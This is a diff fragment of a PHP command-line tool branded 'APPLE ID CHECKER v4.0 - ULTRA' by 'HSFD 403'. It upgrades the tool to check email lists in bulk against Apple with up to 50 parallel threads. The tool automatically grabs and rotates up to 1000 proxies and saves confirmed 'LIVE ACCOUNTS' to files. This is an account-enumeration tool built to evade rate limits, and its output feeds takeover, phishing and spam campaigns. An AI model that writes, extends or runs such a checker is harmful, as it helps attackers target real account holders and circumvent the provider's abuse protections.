+                    $txt .= $r['email'] . ' | ' . $r['status_label'] . $pi . "\n";
+                }
+                return file_put_contents($path, $txt) !== false;
         }
-        $txt .= "\n--- ALL ---\n";
-        foreach ($results as $r) {
-            $pi = !empty($r['proxy_used']) ? ' ['.parse_url($r['proxy_used'], PHP_URL_HOST).']' : '';
-            $txt .= $r['email'] . ' | ' . $r['status'] . ' | ' . $r['status_label'] . $pi . "\n";
-        }
-        return file_put_contents($path, $txt) !== false;
     }
 }
 
 // ============================================================
-// CLI
+// CLI MAIN
 // ============================================================
 
 if (PHP_SAPI === 'cli' && isset($argv[0]) && basename($argv[0]) === basename(__FILE__)) {
-    echo "\n=== APPLE ID CHECKER v2.0 (No-CURL) ===\n\n";
-    
     $options = getopt('', [
-        'email:', 'file:', 'output:', 'format:', 'timeout:', 'delay:',
-        'retries:', 'no-proxy', 'proxy-file:', 'max-proxies:', 'verbose', 'help'
+        'email:', 'file:', 'output:', 'format:',
+        'threads:', 'timeout:', 'no-proxy', 'proxy-file:', 'max-proxies:', 'help'
     ]);
-    
+
     if (isset($options['help']) || (empty($options['email']) && empty($options['file']))) {
-        echo "Usage:\n";
-        echo "  php apple_checker.php --email=user@icloud.com\n";
-        echo "  php apple_checker.php --file=emails.txt\n";
-        echo "  php apple_checker.php --file=emails.txt --output=hasil.csv --format=csv\n";
-        echo "  php apple_checker.php --file=emails.txt --delay=2000000 --retries=3\n";
-        echo "  php apple_checker.php --file=emails.txt --proxy-file=proxies.txt\n";
-        echo "  php apple_checker.php --file=emails.txt --max-proxies=200 --verbose\n";
+        echo "\n";
+        echo Colors::text(" ╔══════════════════════════════════════════════════════════╗\n", Colors::BCYAN);
+        echo Colors::text(" ║              APPLE ID CHECKER v4.0 - ULTRA             ║\n", Colors::BCYAN);
+        echo Colors::text(" ║               Author: HSFD 403 ── 2026                 ║\n", Colors::BCYAN);
+        echo Colors::text(" ╚══════════════════════════════════════════════════════════╝\n\n", Colors::BCYAN);
+
+        echo Colors::text(" USAGE:\n", Colors::BWHITE);
+        echo Colors::text("   php apple_ultra.php --file=emails.txt\n", Colors::ICYAN);
+        echo Colors::text("   php apple_ultra.php --email=user@icloud.com\n", Colors::ICYAN);
+        echo Colors::text("   php apple_ultra.php --file=emails.txt --threads=20 --timeout=15\n", Colors::ICYAN);
+        echo Colors::text("   php apple_ultra.php --file=emails.txt --proxy-file=proxies.txt\n", Colors::ICYAN);
+        echo Colors::text("   php apple_ultra.php --file=emails.txt --output=results.csv --format=csv\n\n", Colors::ICYAN);
+
+        echo Colors::text(" OPTIONS:\n", Colors::BWHITE);
+        echo Colors::text("   --email=<email>       Single email check\n", Colors::WHITE);
+        echo Colors::text("   --file=<path>         Check emails from file\n", Colors::WHITE);
+        echo Colors::text("   --output=<path>       Save results\n", Colors::WHITE);
+        echo Colors::text("   --format=<fmt>        Output format: txt/csv/json\n", Colors::WHITE);
+        echo Colors::text("   --threads=<n>         Parallel threads (1-50, default: 10)\n", Colors::WHITE);
+        echo Colors::text("   --timeout=<sec>       Request timeout (default: 20)\n", Colors::WHITE);
+        echo Colors::text("   --no-proxy            Disable proxy\n", Colors::WHITE);
+        echo Colors::text("   --proxy-file=<path>   Custom proxy list\n", Colors::WHITE);
+        echo Colors::text("   --max-proxies=<n>     Max proxies to grab (default: 1000)\n", Colors::WHITE);
+        echo Colors::text("   --help                This help\n\n", Colors::WHITE);
+
+        echo Colors::text(" ── " . Colors::text("HSFD 403", Colors::BRED) . " ── " . Colors::text("v4.0 ULTRA", Colors::BCYAN) . " ──\n\n";
         exit(0);
     }
-    
+
     try {
-        $checker = new AppleEmailChecker();
-        
+        $checker = new AppleChecker();
+
+        if (isset($options['threads'])) $checker->setThreads((int)$options['threads']);
         if (isset($options['timeout'])) $checker->setTimeout((int)$options['timeout']);
-        if (isset($options['delay'])) $checker->setDelay((int)$options['delay']);
-        if (isset($options['retries'])) $checker->setMaxRetries((int)$options['retries']);
-        if (isset($options['verbose'])) $checker->setVerbose(true);
-        if (isset($options['no-proxy'])) $checker->setProxyRotation(false);
-        
+        if (isset($options['no-proxy'])) $checker->setUseProxy(false);
+
         $pg = $checker->getProxyGrabber();
-        if (isset($options['max-proxies'])) $pg->setMaxProxies((int)$options['max-proxies']);
-        
-        if (isset($options['proxy-file'])) {
-            echo "[*] Load proxies from: {$options['proxy-file']}\n";
-            $proxies = $pg->loadFromFile($options['proxy-file']);
-            echo "[*] Loaded " . count($proxies) . " proxies\n";
-            if (!empty($proxies)) {
-                echo "[*] Testing...\n";
-                $pg->testAllProxies($proxies);
+        if (isset($options['max-proxies'])) $pg->maxProxies = (int)$options['max-proxies'];
+
+        if ($checker->getUseProxy()) {
+            if (isset($options['proxy-file'])) {
+                echo Colors::text(" [*] Loading proxies from: {$options['proxy-file']}\n", Colors::ICYAN);
+                $proxies = $pg->loadFromFile($options['proxy-file']);
+                echo Colors::text(" [+] Loaded " . count($proxies) . " proxies\n", Colors::IGREEN);
+                if (!empty($proxies)) {
+                    $pg->testAll(30);
+                }
+            } else {
+                $pg->grabAll();
+                $pg->testAll(30);
             }
         }
-        
+
         if (isset($options['email'])) {
-            $results = [$checker->check($options['email'])];
+            $results = [$checker->checkEmail($options['email'])];
+
+            echo Colors::text("\n ┌─ RESULT ───────────────────────────────────────────┐\n", Colors::ICYAN);
+            echo sprintf(" │ %s %s %s\n",
+                Colors::status($results[0]['status']),
+                Colors::text(str_pad($results[0]['email'], 30), Colors::BWHITE),
+                Colors::text($results[0]['status_label'], Colors::IGREEN)
+            );
+            echo Colors::text(" └────────────────────────────────────────────────────┘\n", Colors::ICYAN);
         } else {
-            $results = $checker->checkFromFile($options['file'], !isset($options['proxy-file']));
+            $results = $checker->checkFromFile($options['file']);
         }
-        
-        echo "\n" . AppleEmailChecker::formatResults($results);
-        
+
         if (isset($options['output'])) {
             $fmt = $options['format'] ?? 'txt';
-            $ok = false;
-            switch ($fmt) {
-                case 'csv': $ok = AppleEmailChecker::exportToCsv($results, $options['output']); break;
-                case 'json': $ok = AppleEmailChecker::exportToJson($results, $options['output']); break;
-                default: $ok = AppleEmailChecker::exportToTxt($results, $checker->getStats(), $options['output']); break;
-            }
-            if ($ok) echo "[+] Saved to: {$options['output']}\n";
+            $ok = $checker->saveResults($results, $options['output'], $fmt);
+            if ($ok) echo Colors::text(" [+] Results saved to: {$options['output']}\n", Colors::IGREEN);
         }
-        
+
         $live = $checker->getLiveResults();
         if (!empty($live)) {
-            $lf = 'live_' . date('Ymd_His') . '.txt';
-            $c = "=== LIVE ACCOUNTS ===\nDate: " . date('Y-m-d H:i:s') . "\nTotal: " . count($live) . "\n\n";
-            foreach ($live as $r) $c .= $r['email'] . "\n";
+            $lf = 'LIVE_' . date('Ymd_His') . '.txt';
+            $c = "=== LIVE ACCOUNTS ===\nAuthor: HSFD 403\nDate: " . date('Y-m-d H:i:s') . "\nTotal: " . count($live) . "\n\n";
+            foreach ($live as $r) $c .= $r['email'] . " | " . $r['status_label'] . "\n";
             file_put_contents($lf, $c);
-            echo "[+] Live accounts: $lf\n";
+            echo Colors::text(" [+] Live accounts saved: $lf (" . count($live) . ")\n", Colors::IGREEN);
         }
-        
-        $wp = $pg->getTestedProxies();
+
+        $wp = $pg->getTested();
         if (!empty($wp)) {
             $pf = 'proxies_' . date('Ymd_His') . '.txt';
             $pg->saveToFile($pf, $wp);
-            echo "[+] Working proxies: $pf (" . count($wp) . ")\n";
         }
-        
-        $s = $checker->getStats();
-        echo "\n=== STATS ===\n";
-        echo "Total: {$s['total']} | LIVE: {$s['live']} | DIE: {$s['die']} | ERROR: {$s['error']} | Rotations: {$s['proxy_rotations']}\n";
-        
+
     } catch (\Exception $e) {
-        echo "ERROR: " . $e->getMessage() . "\n";
+        echo Colors::text("\n ✖ ERROR: " . $e->getMessage() . "\n", Colors::BRED);
         exit(1);
     }
 }
